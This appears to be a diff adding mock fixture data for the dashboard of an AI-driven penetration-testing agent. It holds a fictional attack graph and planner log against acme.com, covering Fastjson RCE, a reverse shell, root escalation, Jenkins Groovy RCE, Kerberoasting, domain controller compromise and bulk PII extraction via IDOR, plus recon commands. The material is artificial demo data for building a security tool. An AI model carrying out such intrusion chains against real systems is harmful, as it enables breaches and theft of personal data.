+    // ── 第 2 层 · 突破 DMZ 建立立足点 ──
+    {
+      id: "i6",
+      type: "intent",
+      payload: P({ summary: "Fingerprinting shop.acme.com components and correlating with CVEs" }),
+      priority: 7,
+      state: "done",
+      origin: "planner",
+      ts: T("2026-07-25T14:20:00Z"),
+    },
+    {
+      id: "i7",
+      type: "intent",
+      payload: P({ summary: "Triggering deserialization RCE on shop to obtain a reverse shell" }),
+      priority: 9,
+      state: "done",
+      origin: "planner",
+      ts: T("2026-07-25T15:10:00Z"),
+    },
+    {
+      id: "i8",
+      type: "intent",
+      payload: P({ summary: "Local enumeration on the DMZ foothold and privilege escalation to root" }),
+      priority: 8,
+      state: "done",
+      origin: "planner",
+      ts: T("2026-07-25T16:00:00Z"),
+    },
+
+    // ── 第 3 层 · 内网横向纵深（多层测试）──
+    {
+      id: "i9",
+      type: "intent",
+      payload: P({ summary: "Discovering internal network hosts by pivoting through the foothold" }),
+      priority: 8,
+      state: "done",
+      origin: "planner",
+      ts: T("2026-07-25T20:30:00Z"),
+    },
+    {
+      id: "i10",
+      type: "intent",
+      payload: P({ summary: "Credential reuse and password spraying across the internal network" }),
+      priority: 8,
+      state: "running",
+      origin: "planner",
+      ts: T("2026-07-26T03:40:00Z"),
+    },
+    {
+      id: "i11",
+      type: "intent",
+      payload: P({ summary: "Executing an unauthenticated Groovy script (RCE) on internal Jenkins" }),
+      priority: 9,
+      state: "done",
+      origin: "planner",
+      ts: T("2026-07-25T21:30:00Z"),
+    },
+    {
+      id: "i12",
+      type: "intent",
+      payload: P({ summary: "Kerberoasting a domain service account followed by offline cracking" }),
+      priority: 8,
+      state: "done",
+      origin: "planner",
+      ts: T("2026-07-25T22:40:00Z"),
+    },
+    {
+      id: "i13",
+      type: "intent",
+      payload: P({ summary: "Logging in with domain admin credentials to compromise domain controller DC01" }),
+      priority: 10,
+      state: "done",
+      origin: "planner",
+      ts: T("2026-07-25T23:50:00Z"),
+    },
+
+    // ── 事实 ──
+    {
+      id: "fa1",
+      type: "fact",
+      payload: P({ summary: "Discovered subdomain admin.acme.com (Element-UI back office)" }),
+      priority: 0,
+      state: "open",
+      origin: "work#1",
+      ts: T("2026-07-24T09:40:00Z"),
+    },
+    {
+      id: "fa2",
+      type: "fact",
+      payload: P({ summary: "The search page's q parameter is an error-based injection point (MSSQL)" }),
+      priority: 0,
+      state: "open",
+      origin: "work#4",
+      ts: T("2026-07-25T22:05:00Z"),
+    },
+    {
+      id: "faGit",
+      type: "fact",
+      payload: P({ summary: ".git is downloadable; recovered backend source code with git-dumper" }),
+      priority: 0,
+      state: "open",
+      origin: "workG",
+      ts: T("2026-07-25T20:30:00Z"),
+    },
+    {
+      id: "faCreds",
+      type: "fact",
+      payload: P({
+        summary:
+          "DB password sa / Acme@2021 hardcoded in config.php in the source code (suspected shared across the internal network)",
+      }),
+      priority: 0,
+      state: "open",
+      origin: "workG",
+      ts: T("2026-07-25T20:35:00Z"),
+    },
+    {
+      id: "fa3",
+      type: "fact",
+      payload: P({ summary: "shop's fingerprint matches Fastjson 1.2.24 (known deserialization RCE exists)" }),
+      priority: 0,
+      state: "open",
+      origin: "work#6",
+      ts: T("2026-07-25T14:40:00Z"),
+    },
+    {
+      id: "fa4",
+      type: "fact",
+      payload: P({ summary: "Reverse shell succeeded: www-data@dmz-web01 (10.0.20.15), located in the DMZ segment" }),
+      priority: 0,
+      state: "open",
+      origin: "work#7",
+      ts: T("2026-07-25T15:40:00Z"),
+    },
+    {
+      id: "fa5",
+      type: "fact",
+      payload: P({ summary: "sudo -l: (ALL) NOPASSWD: /usr/bin/python3 → privilege escalation to root is possible" }),
+      priority: 0,
+      state: "open",
+      origin: "work#8",
+      ts: T("2026-07-25T16:20:00Z"),
+    },
+    {
+      id: "fa6",
+      type: "fact",
+      payload: P({
+        summary:
+          "The foothold's second NIC connects directly to the internal network 10.10.10.0/24 (crossing the DMZ boundary)",
+      }),
+      priority: 0,
+      state: "open",
+      origin: "work#9",
+      ts: T("2026-07-25T20:40:00Z"),
+    },
+    {
+      id: "fa7",
+      type: "fact",
+      payload: P({
+        summary:
+          "Live internal hosts: 10.10.10.10 DC01 (domain controller) / 10.10.10.5 FS01 (SMB) / 10.10.10.20 JENKINS",
+      }),
+      priority: 0,
+      state: "open",
+      origin: "work#9",
+      ts: T("2026-07-25T21:00:00Z"),
+    },
+    {
+      id: "fa8",
+      type: "fact",
+      payload: P({ summary: "JENKINS console /script is unauthenticated; Groovy can be executed directly" }),
+      priority: 0,
+      state: "open",
+      origin: "work#11",
+      ts: T("2026-07-25T21:45:00Z"),
+    },
+    {
+      id: "fa9",
+      type: "fact",
+      payload: P({
+        summary: "Dumped the plaintext password for domain account acme\\svc_deploy from the Jenkins credential store",
+      }),
+      priority: 0,
+      state: "open",
+      origin: "work#11",
+      ts: T("2026-07-25T22:10:00Z"),
+    },
+    {
+      id: "fa10",
+      type: "fact",
+      payload: P({ summary: "Kerberoasted svc_sql's TGS and cracked the password Sql@2020 with hashcat" }),
+      priority: 0,
+      state: "open",
+      origin: "work#12",
+      ts: T("2026-07-25T23:20:00Z"),
+    },
+
+    // ── 漏洞 ──
+    {
+      id: "fi1",
+      type: "finding",
+      payload: P({ summary: "Back office default password admin/admin123" }),
+      priority: 0,
+      state: "confirmed",
+      origin: "work#2",
+      ts: T("2026-07-26T03:50:00Z"),
+    },
+    {
+      id: "fi2",
+      type: "finding",
+      payload: P({ summary: "SQL injection (search q) allows reading the acme_prod DB" }),
+      priority: 0,
+      state: "confirmed",
+      origin: "work#4",
+      ts: T("2026-07-26T01:20:00Z"),
+    },
+    {
+      id: "fi3",
+      type: "finding",
+      payload: P({ summary: "IDOR: /v1/orders?id= allows viewing other users' orders via authorization bypass" }),
+      priority: 0,
+      state: "confirmed",
+      origin: "work#5",
+      ts: T("2026-07-26T02:44:00Z"),
+    },
+    {
+      id: "fiSrc",
+      type: "finding",
+      payload: P({ summary: "Source code leak + hardcoded database credentials (sa/Acme@2021)" }),
+      priority: 0,
+      state: "confirmed",
+      origin: "workG",
+      ts: T("2026-07-25T20:36:00Z"),
+    },
+    {
+      id: "fiRce",
+      type: "finding",
+      payload: P({ summary: "Obtained server command execution via shop Fastjson deserialization RCE" }),
+      priority: 0,
+      state: "confirmed",
+      origin: "work#7",
+      ts: T("2026-07-25T15:40:00Z"),
+    },
+    {
+      id: "fiPriv",
+      type: "finding",
+      payload: P({
+        summary: "Local privilege escalation to root on the DMZ foothold (sudo NOPASSWD misconfiguration)",
+      }),
+      priority: 0,
+      state: "confirmed",
+      origin: "work#8",
+      ts: T("2026-07-25T16:20:00Z"),
+    },
+    {
+      id: "fiJenkins",
+      type: "finding",
+      payload: P({ summary: "Internal Jenkins unauthenticated Groovy → server RCE" }),
+      priority: 0,
+      state: "confirmed",
+      origin: "work#11",
+      ts: T("2026-07-25T21:50:00Z"),
+    },
+    {
+      id: "fiKerb",
+      type: "finding",
+      payload: P({ summary: "Cracked domain service account svc_sql's password via Kerberoasting" }),
+      priority: 0,
+      state: "confirmed",
+      origin: "work#12",
+      ts: T("2026-07-25T23:20:00Z"),
+    },
+    {
+      id: "fiDC",
+      type: "finding",
+      payload: P({ summary: "Domain controller DC01 compromised (Domain Admin): internal objective achieved" }),
+      priority: 0,
+      state: "confirmed",
+      origin: "work#13",
+      ts: T("2026-07-26T00:20:00Z"),
+    },
+
+    // ── 提示（主 agent 注入）──
+    {
+      id: "h1",
+      type: "hint",
+      payload: P({ summary: "Since the back office is Element-UI, try the default password list first" }),
+      priority: 5,
+      state: "consumed",
+      origin: "mainagent",
+      ts: T("2026-07-26T03:20:00Z"),
+    },
+    {
+      id: "h2",
+      type: "hint",
+      payload: P({
+        summary: "Prioritize Jenkins on the internal network: go straight for Groovy RCE via unauthenticated /script",
+      }),
+      priority: 6,
+      state: "consumed",
+      origin: "mainagent",
+      ts: T("2026-07-25T21:20:00Z"),
+    },
+    {
+      id: "h3",
+      type: "hint",
+      payload: P({ summary: "Spray that DB password from the source code across the internal network; likely shared" }),
+      priority: 6,
+      state: "consumed",
+      origin: "mainagent",
+      ts: T("2026-07-25T23:10:00Z"),
+    },
+  ],
+  edges: [
+    // 根 → 目标
+    { src: "root", dst: "g1", rel: "spawns" },
+    { src: "root", dst: "g2", rel: "spawns" },
+    { src: "root", dst: "g3", rel: "spawns" },
+    { src: "root", dst: "g4", rel: "spawns" },
+    // 目标 → 意图
+    { src: "g1", dst: "i1", rel: "spawns" },
+    { src: "g1", dst: "i2", rel: "spawns" },
+    { src: "g1", dst: "i3", rel: "spawns" },
+    { src: "g2", dst: "i4", rel: "spawns" },
+    { src: "g2", dst: "i5", rel: "spawns" },
+    { src: "g2", dst: "ig", rel: "spawns" },
+    { src: "g3", dst: "i6", rel: "spawns" },
+    { src: "g3", dst: "i7", rel: "spawns" },
+    { src: "g3", dst: "i8", rel: "spawns" },
+    { src: "g4", dst: "i9", rel: "spawns" },
+    { src: "g4", dst: "i10", rel: "spawns" },
+    { src: "g4", dst: "i11", rel: "spawns" },
+    { src: "g4", dst: "i12", rel: "spawns" },
+    { src: "g4", dst: "i13", rel: "spawns" },
+    // 意图 → 事实 / 漏洞（产出）
+    { src: "i1", dst: "fa1", rel: "yields" },
+    { src: "i4", dst: "fa2", rel: "yields" },
+    { src: "i2", dst: "fi1", rel: "yields" },
+    { src: "i4", dst: "fi2", rel: "yields" },
+    { src: "i5", dst: "fi3", rel: "yields" },
+    { src: "ig", dst: "faGit", rel: "yields" },
+    { src: "ig", dst: "faCreds", rel: "yields" },
+    { src: "ig", dst: "fiSrc", rel: "yields" },
+    { src: "i6", dst: "fa3", rel: "yields" },
+    { src: "i7", dst: "fa4", rel: "yields" },
+    { src: "i7", dst: "fiRce", rel: "yields" },
+    { src: "i8", dst: "fa5", rel: "yields" },
+    { src: "i8", dst: "fiPriv", rel: "yields" },
+    { src: "i9", dst: "fa6", rel: "yields" },
+    { src: "i9", dst: "fa7", rel: "yields" },
+    { src: "i11", dst: "fa8", rel: "yields" },
+    { src: "i11", dst: "fa9", rel: "yields" },
+    { src: "i11", dst: "fiJenkins", rel: "yields" },
+    { src: "i12", dst: "fa10", rel: "yields" },
+    { src: "i12", dst: "fiKerb", rel: "yields" },
+    { src: "i13", dst: "fiDC", rel: "yields" },
+    // 事实 → 新意图（事实驱动的多层递进）
+    { src: "fa3", dst: "i7", rel: "derived_from" },
+    { src: "fa4", dst: "i8", rel: "derived_from" },
+    { src: "fa4", dst: "i9", rel: "derived_from" },
+    { src: "faCreds", dst: "i10", rel: "derived_from" },
+    { src: "fa7", dst: "i11", rel: "derived_from" },
+    { src: "fa7", dst: "i12", rel: "derived_from" },
+    { src: "fa9", dst: "i13", rel: "derived_from" },
+    { src: "fa10", dst: "i13", rel: "derived_from" },
+    // 提示 → 意图
+    { src: "h1", dst: "i2", rel: "derived_from" },
+    { src: "h2", dst: "i11", rel: "derived_from" },
+    { src: "h3", dst: "i10", rel: "derived_from" },
+    // 漏洞 → 证明目标达成
+    { src: "fi1", dst: "g1", rel: "proves" },
+    { src: "fiRce", dst: "g3", rel: "proves" },
+    { src: "fiDC", dst: "g4", rel: "proves" },
+  ],
+};
+
+export const intents: TaskNode[] = explorationGraph.nodes.filter((n) => n.type === "intent");
+export const frontier: TaskNode[] = explorationGraph.nodes.filter(
+  (n) => n.type === "intent" && (n.state === "open" || n.state === "running"),
+);
+
+// ── Activity（执行过程）─────────────────────────────────────────────────────
+// 会话由 sessions-tab 从「意图」派生（session.id = intent.id），transcript = 匹配
+// intent_id 的活动流。planner=worker "planner"、主 agent=worker "mainagent"。
+// 每个 worker 会话含完整工具执行链（tool_use → tool_result → …→ result）。
+export const activity: Activity[] = [
+  // planner —— 每轮完整决策链：读态势 → 拉 worker 产出对照 → 判目标 → add_intent 派方向
+  // ── 第 0 轮 · 目标拆解与首批意图（2026-07-24 09:12）──
+  {
+    seq: 1000,
+    worker: "planner",
+    ts: T("2026-07-24T09:12:10Z"),
+    kind: "round",
+    summary: "Round 0 · Goal decomposition",
+  },
+  {
+    seq: 1001,
+    worker: "planner",
+    ts: T("2026-07-24T09:12:25Z"),
+    kind: "thinking",
+    summary:
+      'graph_overview: goals have already been decomposed at the goal layer. g1 "obtain admin access to the acme.com back office" and g2 "access sensitive user data" are both open, facts=0, and recent_facts is empty (the graph is nearly blank, no worker output yet). The only in-scope assets are the root domain acme.com and a single class-C block. Initial attack-surface assessment identifies five entry points: www / admin / api / shop / vpn. Since there are no facts in the graph yet, I can only refine the initial intents with [very light read-only probing] — I will not perform actual work during the plan phase.',
+  },
+  {
+    seq: 1002,
+    worker: "planner",
+    ts: T("2026-07-24T09:12:40Z"),
+    kind: "tool_use",
+    tool: "bash",
+    tool_use_id: "p0-probe",
+    summary: "curl -sI https://acme.com; curl -sI https://admin.acme.com",
+    detail:
+      "Since the initial situation is nearly blank, perform at most 3 read-only probes to calibrate the direction of the initial intents (no enumeration or verification — that is the worker's job).",
+  },
+  {
+    seq: 1003,
+    worker: "planner",
+    ts: T("2026-07-24T09:12:52Z"),
+    kind: "tool_result",
+    tool: "bash",
+    tool_use_id: "p0-probe",
+    summary:
+      "acme.com → 302 → www; Server: nginx/1.24.0\nadmin.acme.com → 200, no X-Powered-By header, element-ui/vue signatures detected in body",
+    detail:
+      "admin is a standalone back-office login page. Confirmed all five entry points are valid, so the initial intent descriptions can be written precisely.",
+  },
+  {
+    seq: 1004,
+    worker: "planner",
+    ts: T("2026-07-24T09:13:00Z"),
+    kind: "tool_use",
+    tool: "add_intent",
+    tool_use_id: "p0-ai",
+    summary: "add_intent × 4 (dispatching the first batch of exploration directions)",
+    detail:
+      "intents=[\n  { summary: 'Enumerate all acme.com subdomains + identify ports/services on live hosts to map the attack surface', asset_ids: [acme.com], priority: 6 },\n  { summary: 'Test default/weak passwords on the admin.acme.com back office (Element-UI login, no CAPTCHA)', asset_ids: [admin], priority: 9 },\n  { summary: 'Detect SQL injection in the www.acme.com/search q parameter', asset_ids: [www], priority: 8 },\n  { summary: 'Test authorization bypass (IDOR) on the api.acme.com order endpoint', asset_ids: [api], priority: 8 },\n]\nAll parent_ids are empty (these are top-level new directions, so they fall back to the origin fact).",
+  },
+  {
+    seq: 1005,
+    worker: "planner",
+    ts: T("2026-07-24T09:13:02Z"),
+    kind: "tool_result",
+    tool: "add_intent",
+    tool_use_id: "p0-ai",
+    summary: "4 intents created → ids=[i1, i2, i4, i5], linked into the frontier",
+    detail:
+      "Deliberately preserving path diversity. i1 recon + i2 (g1's auth path) + i4/i5 (g2's data path) run two independent attack techniques in parallel, avoiding premature convergence.",
+  },
+  {
+    seq: 1006,
+    worker: "planner",
+    ts: T("2026-07-24T09:13:05Z"),
+    kind: "text",
+    summary:
+      "This round derived the first four intents: i1 asset recon, i2 back-office passwords, i4 injection, i5 API authorization bypass. g1 proceeds via i2 and g2 via i4/i5, with both goals pursuing independent entry points. Once workers produce facts, I will reinforce along whichever chain they feed.",
+  },
+
+  // ── 第 1 轮 · 攻击面加码（2026-07-25 14:12）──
+  {
+    seq: 1100,
+    worker: "planner",
+    ts: T("2026-07-25T14:12:00Z"),
+    kind: "round",
+    summary: "Round 1 · Attack surface reinforcement",
+  },
+  {
+    seq: 1101,
+    worker: "planner",
+    ts: T("2026-07-25T14:12:15Z"),
+    kind: "thinking",
+    summary:
+      'Cross-checking recent_facts: workG reported faGit ".git is downloadable, recovered backend source code with git-dumper" and faCreds "sa/Acme@2021 hardcoded in config.php (suspected shared across the internal network)", and work#6\'s fingerprinting reported fa3 "detected Fastjson 1.2.24 on shop (known deserialization RCE exists)". There are two [new techniques worth building on]: (1) the hardcoded DB password may be reused across the internal network, and (2) Fastjson has a mature RCE technique. This opens an entry point [fundamentally different] from the existing auth/injection paths — a direct RCE route into the DMZ via shop. First, pull faGit\'s details to confirm what was actually recovered.',
+  },
+  {
+    seq: 1102,
+    worker: "planner",
+    ts: T("2026-07-25T14:12:28Z"),
+    kind: "tool_use",
+    tool: "node_detail",
+    tool_use_id: "p1-nd",
+    summary: "node_detail(faGit): cross-checking workG's recovered source code output",
+    detail:
+      "Before add_intent, confirm what the worker actually recovered, to avoid guessing a direction from fingerprinting alone.",
+  },
+  {
+    seq: 1103,
+    worker: "planner",
+    ts: T("2026-07-25T14:12:35Z"),
+    kind: "tool_result",
+    tool: "node_detail",
+    tool_use_id: "p1-nd",
+    summary:
+      "faGit evidence: recovered config.php / db.php / order_api.php with git-dumper. In config.php: $db=['host'=>'10.10.10.5','user'=>'sa','pass'=>'Acme@2021']",
+    detail:
+      'The hardcoded value points at internal host 10.10.10.5 (FS01), supporting faCreds\' "shared across the internal network" hypothesis. Once an RCE lands, this credential pair is worth reusing.',
+  },
+  {
+    seq: 1104,
+    worker: "planner",
+    ts: T("2026-07-25T14:12:50Z"),
+    kind: "tool_use",
+    tool: "add_intent",
+    tool_use_id: "p1-ai",
+    summary: "add_intent × 2 (Fastjson breach chain, dispatching from the first executable serial step)",
+    detail:
+      "intents=[\n  { summary: 'Deep fingerprint analysis of shop.acme.com components + precise correlation with the Fastjson 1.2.24 CVE (confirm gadget chain)', asset_ids: [shop], parent_ids: [fa3], priority: 7 },\n  { summary: 'Build a Fastjson deserialization payload to trigger RCE on shop and obtain a reverse shell', asset_ids: [shop], parent_ids: [fa3], priority: 9 },\n]\nNote: since this is a tightly coupled serial chain, logged the three-step sequence \"fingerprint → RCE → foothold privilege escalation\" in TodoWrite, and this round only dispatches the first two steps (privilege escalation depends on shell output, so it is dispatched next round).",
+  },
+  {
+    seq: 1105,
+    worker: "planner",
+    ts: T("2026-07-25T14:12:52Z"),
+    kind: "tool_result",
+    tool: "add_intent",
+    tool_use_id: "p1-ai",
+    summary: "2 intents created → ids=[i6, i7], linked into the chain via fa3",
+  },
+  {
+    seq: 1106,
+    worker: "planner",
+    ts: T("2026-07-25T14:13:00Z"),
+    kind: "text",
+    summary:
+      'Escalating the situation: the source code + hardcoded internal network password + Fastjson RCE form an entirely new breach path. Requested registration of g3 "breach the DMZ from the external network and establish an internal foothold" at the goal layer, and dispatched i6 (fingerprint/CVE correlation) and i7 (RCE triggering). The DMZ privilege-escalation step depends on a shell, so it is logged as a to-do and dispatched next round.',
+  },
+
+  // ── 第 2 轮 · 立足点已建，转内网（2026-07-25 20:25）──
+  {
+    seq: 1200,
+    worker: "planner",
+    ts: T("2026-07-25T20:25:00Z"),
+    kind: "round",
+    summary: "Round 2 · Foothold established, pivoting to the internal network",
+  },
+  {
+    seq: 1201,
+    worker: "planner",
+    ts: T("2026-07-25T20:25:18Z"),
+    kind: "thinking",
+    summary:
+      'Cross-checking the chain: i7 reported fa4 "reverse shell www-data@dmz-web01 (10.0.20.15), located in the DMZ segment", and the privilege-escalation chain reported fa5 "detected NOPASSWD python3 in sudo -l → privilege escalation to root is possible" and fa6 "the foothold\'s second NIC connects directly to the internal network 10.10.10.0/24". g3\'s acceptance criteria (DMZ breach + foothold established) are already directly satisfied by fa4+fa6. First confirm fa6\'s internal-network reachability, then prove_goal.',
+  },
+  {
+    seq: 1202,
+    worker: "planner",
+    ts: T("2026-07-25T20:25:30Z"),
+    kind: "tool_use",
+    tool: "node_detail",
+    tool_use_id: "p2-nd",
+    summary: "node_detail(fa6): confirming the dual NIC and internal-network reachability",
+  },
+  {
+    seq: 1203,
+    worker: "planner",
+    ts: T("2026-07-25T20:25:38Z"),
+    kind: "tool_result",
+    tool: "node_detail",
+    tool_use_id: "p2-nd",
+    summary:
+      "fa6 evidence: ip a → eth0 10.0.20.15 (DMZ) / eth1 10.10.10.15 (internal network); ping 10.10.10.10 succeeded, confirming DMZ boundary traversal",
+  },
+  {
+    seq: 1204,
+    worker: "planner",
+    ts: T("2026-07-25T20:25:50Z"),
+    kind: "tool_use",
+    tool: "prove_goal",
+    tool_use_id: "p2-pg",
+    summary: "prove_goal(g3, evidence=fa6)",
+    detail:
+      "reason: i7's RCE established the DMZ foothold (fa4), fa5 escalated to root, and fa6 proves the second NIC's direct internal-network connection and a successful ping to DC01. The acceptance criterion \"breach the DMZ, establish an internal foothold\" is met.",
+  },
+  {
+    seq: 1205,
+    worker: "planner",
+    ts: T("2026-07-25T20:25:52Z"),
+    kind: "tool_result",
+    tool: "prove_goal",
+    tool_use_id: "p2-pg",
+    summary: "goal g3 → met (linked to evidence fa6); g1/g2/g4 are still unmet, so work continues",
+  },
+  {
+    seq: 1206,
+    worker: "planner",
+    ts: T("2026-07-25T20:26:10Z"),
+    kind: "tool_use",
+    tool: "add_intent",
+    tool_use_id: "p2-ai",
+    summary: "add_intent × 4 (lateral movement across the internal network by pivoting through the foothold)",
+    detail:
+      "intents=[\n  { summary: 'Pivot through dmz-web01 to discover hosts and identify ports on the internal network 10.10.10.0/24', asset_ids: [dmz-web01], parent_ids: [fa6], priority: 8 },\n  { summary: 'Internal lateral movement: credential reuse and password spraying with the hardcoded password sa/Acme@2021', parent_ids: [faCreds], priority: 8 },\n  { summary: 'Execute Groovy via unauthenticated /script on internal Jenkins (10.10.10.20) (RCE)', parent_ids: [fa6], priority: 9 },\n  { summary: 'Kerberoast a domain service account followed by offline cracking', parent_ids: [fa6], priority: 8 },\n]\nHost discovery is the prerequisite step (dispatched first), and the remaining three run as parallel lateral-exploration tracks.",
+  },
+  {
+    seq: 1207,
+    worker: "planner",
+    ts: T("2026-07-25T20:26:12Z"),
+    kind: "tool_result",
+    tool: "add_intent",
+    tool_use_id: "p2-ai",
+    summary: "4 intents created → ids=[i9, i10, i11, i12]",
+  },
+  {
+    seq: 1208,
+    worker: "planner",
+    ts: T("2026-07-25T20:26:20Z"),
+    kind: "text",
+    summary:
+      'g3 achieved; the attack surface has shifted from the external to the internal network. Requested registration of g4 "move laterally through the internal network to compromise the target domain controller DC01", and dispatched i9 (host discovery) plus three parallel lateral-movement intents i10/i11/i12. Credential reuse is anchored directly to faCreds — reinvesting the password obtained from the external source code leak into internal lateral movement.',
+  },
+
+  // ── 第 3 轮 · 靶标达成复盘（2026-07-26 00:25）──
+  {
+    seq: 1300,
+    worker: "planner",
+    ts: T("2026-07-26T00:25:00Z"),
+    kind: "round",
+    summary: "Round 3 · Target achievement review",
+  },
+  {
+    seq: 1301,
+    worker: "planner",
+    ts: T("2026-07-26T00:25:16Z"),
+    kind: "thinking",
+    summary:
+      'Cross-checking this round\'s worker output: i9→fa7 "live internal hosts DC01/FS01/JENKINS", i11→fa8 "unauthenticated Groovy via Jenkins /script" + fa9 "extracted acme\\svc_deploy\'s plaintext password from the Jenkins credential store", i12→fa10 "Kerberoasted svc_sql\'s TGS and cracked Sql@2020 with hashcat". svc_deploy belongs to Domain Admins, and i13 used it to compromise DC01 via psexec and run secretsdump. g4\'s acceptance criterion (DC01 compromise) should already be met, so cross-check the finding evidence chain first, then confirm.',
+  },
+  {
+    seq: 1302,
+    worker: "planner",
+    ts: T("2026-07-26T00:25:30Z"),
+    kind: "tool_use",
+    tool: "list_findings",
+    tool_use_id: "p3-lf",
+    summary: "list_findings: cross-checking the evidence confirming DC01's compromise",
+  },
+  {
+    seq: 1303,
+    worker: "planner",
+    ts: T("2026-07-26T00:25:40Z"),
+    kind: "tool_result",
+    tool: "list_findings",
+    tool_use_id: "p3-lf",
+    summary:
+      'F-09 "full compromise of domain controller DC01 / extracted entire domain\'s hashes via secretsdump" critical (evidence: psexec svc_deploy@10.10.10.10 + NTDS.dit dump); upstream chain fa9→fa10→i13 is complete',
+  },
+  {
+    seq: 1304,
+    worker: "planner",
+    ts: T("2026-07-26T00:25:52Z"),
+    kind: "tool_use",
+    tool: "prove_goal",
+    tool_use_id: "p3-pg",
+    summary: "prove_goal(g4, evidence=F-09)",
+    detail:
+      'reason: Jenkins leaked svc_deploy (Domain Admin) → DC01 compromised via psexec → entire domain\'s hashes extracted via secretsdump, F-09 confirmed, "compromise the target domain controller DC01" achieved.',
+  },
+  {
+    seq: 1305,
+    worker: "planner",
+    ts: T("2026-07-26T00:25:54Z"),
+    kind: "tool_result",
+    tool: "prove_goal",
+    tool_use_id: "p3-pg",
+    summary:
+      "goal g4 → met; system note: g2 is still open and is not the final goal, so the task is not yet fully complete",
+  },
+  {
+    seq: 1306,
+    worker: "planner",
+    ts: T("2026-07-26T00:26:10Z"),
+    kind: "text",
+    summary:
+      'g4 wrapped up; the internal/external path is fully breached (external RCE → DMZ → internal network → domain controller). Checking uncovered directions one by one. g2 "access sensitive user data" is still one step short, but the existing i3 (back-office user endpoints) + i5 (API IDOR) already cover that direction and both are running. Since there is no [fundamentally different uncovered new direction] this round, per the restraint principle: zero new intents, wait for i3/i5 output.',
+  },
+
+  // ── 第 4 轮 · 后台达成，收敛 g2（2026-07-26 03:55）──
+  {
+    seq: 1400,
+    worker: "planner",
+    ts: T("2026-07-26T03:55:00Z"),
+    kind: "round",
+    summary: "Round 4 · Back office achieved, converging on g2",
+  },
+  {
+    seq: 1401,
+    worker: "planner",
+    ts: T("2026-07-26T03:55:14Z"),
+    kind: "thinking",
+    summary:
+      "Cross-checking recent_facts: work#2 hit the admin back office with faCreds' Acme@2021 (i2 done), gaining back-office admin access. g1's acceptance criterion is met, so confirm it with prove_goal first. Next, run a [quantitative acceptance check]. g2 \"access sensitive user data\" — i3/i5 have so far only touched the endpoint surface without actually acquiring bulk data, falling short of the measured bar, so prove_goal is [prohibited] here; instead raise priority to reinforce the data-acquisition intents.",
+  },
+  {
+    seq: 1402,
+    worker: "planner",
+    ts: T("2026-07-26T03:55:26Z"),
+    kind: "tool_use",
+    tool: "prove_goal",
+    tool_use_id: "p4-pg",
+    summary: "prove_goal(g1, evidence=fa1)",
+    detail:
+      "reason: i2 logged into the admin back office (Element-UI) successfully using the hardcoded password Acme@2021 leaked from the external network, gaining back-office admin access; g1 achieved.",
+  },
+  {
+    seq: 1403,
+    worker: "planner",
+    ts: T("2026-07-26T03:55:28Z"),
+    kind: "tool_result",
+    tool: "prove_goal",
+    tool_use_id: "p4-pg",
+    summary: "goal g1 → met; remaining unmet: g2",
+  },
+  {
+    seq: 1404,
+    worker: "planner",
+    ts: T("2026-07-26T03:55:40Z"),
+    kind: "thinking",
+    summary:
+      'g2 quantitative check: the goal requirement "access sensitive user data" means actually acquiring bulk user records. graph_overview\'s findings has no "user data extraction succeeded" entry yet, and i3/i5 are both still running without reporting data-acquisition results. This falls short of the measured bar. Strictly prohibited: prematurely marking it met with "already in the back office, so roughly achieved" — keep dispatching intents to close the gap.',
+  },
+  {
+    seq: 1405,
+    worker: "planner",
+    ts: T("2026-07-26T03:55:52Z"),
+    kind: "tool_use",
+    tool: "add_intent",
+    tool_use_id: "p4-ai",
+    summary: "add_intent × 2 (converging on g2 data acquisition, raising priority)",
+    detail:
+      "intents=[\n  { summary: 'Having completed admin back-office login, enumerate user management/export endpoints to bulk-extract sensitive user fields', asset_ids: [admin], parent_ids: [fa1], priority: 9 },\n  { summary: 'Iterate order_id via the api.acme.com order IDOR to bulk-extract user orders/PII', asset_ids: [api], parent_ids: [fa2], priority: 9 },\n]\nNote: i3/i5 are already running, so this round reinforces them with more precise data-acquisition descriptions and a raised priority (→9), rather than dispatching duplicate intents with the same meaning.",
+  },
+  {
+    seq: 1406,
+    worker: "planner",
+    ts: T("2026-07-26T03:55:54Z"),
+    kind: "tool_result",
+    tool: "add_intent",
+    tool_use_id: "p4-ai",
+    summary:
+      '2 intents updated → ids=[i3, i5] (priority raised to 9, descriptions sharpened to "bulk data acquisition")',
+  },
+  {
+    seq: 1407,
+    worker: "planner",
+    ts: T("2026-07-26T03:55:58Z"),
+    kind: "text",
+    summary:
+      "g1 achieved (3 of 4 goals met: g1/g3/g4). g2 strictly enforces its quantitative acceptance criterion. Merely entering the back office does not count — confirmation requires actually acquiring bulk user data. Raised i3/i5 to priority 9 and sharpened them into data-acquisition intents; once the workers report back, the whole task can be wrapped up.",
+  },
+
+  // work#1 · i1 子域枚举与端口扫描（done）
+  {
+    seq: 10,
+    worker: "work#1",
+    intent_id: "i1",
+    ts: T("2026-07-24T09:20:00Z"),
+    kind: "thinking",
+    summary: "First passively reconnoiter subdomains, then identify ports/services on the live hosts.",
+  },
+  {
+    seq: 11,
+    worker: "work#1",
+    intent_id: "i1",
+    ts: T("2026-07-24T09:20:30Z"),
+    kind: "tool_use",
+    tool: "bash",
+    tool_use_id: "t11",
+    summary: "subfinder -d acme.com -silent | httpx -silent -sc -title",
+  },
+  {
+    seq: 12,
+    worker: "work#1",
+    intent_id: "i1",
+    ts: T("2026-07-24T09:22:10Z"),
+    kind: "tool_result",
+    tool: "bash",
+    tool_use_id: "t11",
+    summary:
+      "www.acme.com [200] Acme Corp\nadmin.acme.com [200] Acme Admin Login\napi.acme.com [401]\nshop.acme.com [200]\nvpn.acme.com [200]",
+    detail: "5 live subdomains, of which admin is a back-office login page.",
+  },
+  {
+    seq: 13,
+    worker: "work#1",
+    intent_id: "i1",
+    ts: T("2026-07-24T09:23:00Z"),
+    kind: "tool_use",
+    tool: "bash",
+    tool_use_id: "t12",
+    summary: "nmap -sV -T4 -p- 203.0.113.10",
+  },
+  {
+    seq: 14,
+    worker: "work#1",
+    intent_id: "i1",
+    ts: T("2026-07-24T09:26:40Z"),
+    kind: "tool_result",
+    tool: "bash",
+    tool_use_id: "t12",
+    summary: "22/tcp ssh OpenSSH 8.9p1\n80/tcp http nginx 1.24.0\n443/tcp https nginx 1.24.0",
+    detail: "Ports 22/80/443 are open.",
+  },
+  {
+    seq: 15,
+    worker: "work#1",
+    intent_id: "i1",
+    ts: T("2026-07-24T09:27:00Z"),
+    kind: "tool_use",
+    tool: "upsert_asset",
+    tool_use_id: "t13",
+    summary: "upsert_asset × 6 (subdomains + services)",
+  },
+  {
+    seq: 16,
+    worker: "work#1",
+    intent_id: "i1",
